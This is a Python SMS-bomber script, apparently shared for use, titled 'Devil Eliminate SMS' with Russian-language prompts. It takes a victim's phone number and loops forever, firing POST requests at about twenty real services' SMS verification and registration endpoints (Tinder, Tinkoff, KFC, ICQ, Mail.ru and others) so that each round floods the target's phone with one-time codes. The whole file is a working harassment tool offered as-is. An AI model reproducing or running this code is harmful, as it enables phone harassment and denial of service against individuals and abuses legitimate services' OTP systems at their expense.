import requests, random, datetime, sys, time, argparse, os
from colorama import Fore, Back, Style
red='\033[31m'
print(f'''{red}
⣿⣿⣿⣿⣿⡿⠋⠁⠄⠄⠄⠈⠘⠩⢿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⠃⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠻⣿⣿⣿⣿
⣿⣿⣿⣿⠄⠄⣀⣤⣤⣤⣄⡀⠄⠄⠄⠄⠙⣿⣿⣿
⣿⣿⣿⣿⡀⢰⣿⣿⣿⣿⣿⢿⠄⠄⠄⠄⠄⠹⢿⣿
⣿⣿⣿⣿⣿⡞⠻⠿⠟⠋⠉⠁⣤⡀⠄⠄⠄⠄⠄⠄
⣿⣿⣿⣿⣿⣿⣶⢼⣷⡤⣦⣿⠛⡰⢃⠄⠐⠄⠄⢸
⣿⣿⣿⣿⣿⣿⣿⡯⢍⠿⢾⡿⣸⣿⠰⠄⢀⠄⠄⡬
⣿⣿⣿⣿⣿⣿⣿⣴⣴⣅⣾⣿⣿⡧⠦⡶⠃⠄⠠⢴
⣿⣿⣿⣿⠿⠍⣿⣿⣿⣿⣿⣿⣿⢇⠟⠁⠄⠄⠄⠄
⠟⠛⠉⠄⠄⠄⡽⣿⣿⣿⣿⣿⣯⠏⠄⠄⠄⠄⠄⠄
⠄⠄⠄⢀⣾⣾⣿⣤⣯⣿⣿⡿⠃⠄⠄⠄⠄⠄.. 
''')
banner = """
 ___________________________
|                           |
| Devil Eliminate SMS       |
| Fast Spam 20 sms / 1 krug |
| Author: Cryptons          |
| Mod author: temirovazat   |
| Version: 1.0.1            |
| Mod version 1.1           |
|___________________________|
"""

print(banner)
_phone = input('Введите номер телефона  (79xxxxxxxxx)-->> ')


if _phone[0] == '+':
	_phone = _phone[1:]
if _phone[0] == '8':
	_phone = '7'+_phone[1:]
if _phone[0] == '9':
	_phone = '7'+_phone

_name = ''
for x in range(12):
	_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

_phone9 = _phone[1:]
_phoneAresBank = '+'+_phone[0]+'('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phone9dostavista = _phone9[:3]+'+'+_phone9[3:6]+'-'+_phone9[6:8]+'-'+_phone9[8:10]
_phoneOstin = '+'+_phone[0]+'+('+_phone[1:4]+')'+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]
_phonePizzahut = '+'+_phone[0]+' ('+_phone[1:4]+') '+_phone[4:7]+' '+_phone[7:9]+' '+_phone[9:11]
_phoneGorzdrav = _phone[1:4]+') '+_phone[4:7]+'-'+_phone[7:9]+'-'+_phone[9:11]

iteration = 0
while True:
	_email = _name+f'{iteration}'+'@gmail.com'
	email = _name+f'{iteration}'+'@gmail.com'

	try:
		requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
		print('[+] RuTaxi отправлено!')
	except:
		print('[-] RuTaxi не отправлено!')



	try:
		requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': _phone}, headers={})
		print('[+] BelkaCar отправлено!')
	except:
		print('[-] BelkaCar не отправлено!')



	try:
		requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
		print('[+] Tinder отправлено!')
	except:
		print('[-] Tinder не отправлено!')


	try:
		requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+_phone}, headers={})
		print('[+] Tinkoff отправлено!')
	except:
		print('[-] Tinkoff не отправлено!')



	try:
		requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
		print('[+] MTS отправлено!')
	except:
		print('[-] MTS не отправлено!')



	try:
		requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
		print('[+] Youla отправлено!')
	except:
		print('[-] Youla не отправлено!')



	try:
		requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
		print('[+] Sunlight отправлено!')
	except:
		print('[-] Sunlight не отправлено!')



	try:
		requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
		print('[+] Beltelcom отправлено!')
	except:
		print('[-] Beltelcom не отправлено!')



	try:
		requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
		print('[+] KFC отправлено!')
	except:
		print('[-] KFC не отправлено!')



	try:
		requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',data={'msisdn': _phone, "locale": 'en', 'countryCode': 'ru','version': '1', "k": "ic1rtwz1s1Hj1O0r", "r": "46763"})
		print('[+] ICQ отправлено!')
	except:
		print('[-] ICQ не отправлено!')



	try:
		requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",data={"mode": "request", "phone": "+" + _phone,"phone_permission": "unknown", "stream_id": 0, "v": 3, "appversion": "3.20.6","osversion": "unknown", "devicemodel": "unknown"})
		print('[+] InDriver отправлено!')
	except:
		print('[-] InDriver не отправлено!')



	try:
		requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
		print('[+] IVI отправлено!')
	except:
		print('[-] IVI не отправлено!')



	try:
		requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
		print('[+] Mail.ru отправлено!')
	except:
		print('[-] Mail.ru не отправлено!')


	try:
		requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",data={"st.r.phone": "+" + _phone})
		print('[+] OK отправлено!')
	except:
		print('[-] ОК не отправлено!')

	try:
		requests.post('https://www.delivery-club.ru/ajax/user_otp', data={"phone": _phone})
		print('[+] Delivery отправлено!')
	except:
		print('[-] Delivery не отправлено!')
	try:
		requests.post('https://dostavista.ru/backend/send-verification-sms', data={"phone": _phone})
		print('[+] Dostavista отправлено!')
	except:
		print('[-] Dostavista не отправлено!')
	try:
		requests.post('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+38%20(050)%20326-87-32', data={"phone": _phone})
		print('[+] SportMaster отправлено!')
	except:
		print('[-] SportMaster не отправлено!')
	try:
		requests.post('https://alfalife.cc/auth.php', data={"phone": _phone})
		print('[+] AlfaLife отправлено!')
	except:
		print('[-] AlfaLife не отправлено!')
		
		
	try:
		requests.post('https://koronapay.com/transfers/online/api/users/otps', data={"phone": _phone})
		print('[+] KoronaPay отправлено!')
	except:
		print('[-] KoronaPay не отправлено!')
		
	try:
		requests.post('https://account.my.games/signup_send_sms/', data={"phone": _phone})
		print('[+] MyGames отправлено!')
	except:
		print('[-] MyGames не отправлено!')

	try:
		iteration += 1
		print(('{} круг пройден.').format(iteration))
	except:
		break
